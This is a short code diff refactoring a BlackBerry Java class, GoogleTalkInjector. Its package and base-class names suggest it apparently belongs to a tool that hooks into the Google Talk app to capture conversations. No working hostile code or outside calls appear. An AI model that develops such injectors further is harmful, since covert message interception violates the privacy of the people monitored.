@@ -1,32 +1,18 @@
 package blackberry.injection.injectors;
 
-import net.rim.device.api.ui.Screen;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 
-public class GoogleTalkInjector extends AInjector {
+public class GoogleTalkInjector extends AConversationInjector {
 
     //#ifdef DEBUG
     private static Debug debug = new Debug("GoogleTalkInjector",
             DebugLevel.VERBOSE);
+
     //#endif
-    
-    public boolean enabled(){
-        return false;
-    }
-    
-    public String getAppName() {        
-        return "Google talk";
-    }
 
-    public String[] getWantedScreen() {
-        return new String[0];
-    }
-
-    public void playOnScreen(Screen screen) {
-        //#ifdef DEBUG
-        debug.trace("playOnScreen: " +screen);
-        //#endif
+    public String getAppName() {
+        return "Google Talk";
     }
 
     public String getCodName() {
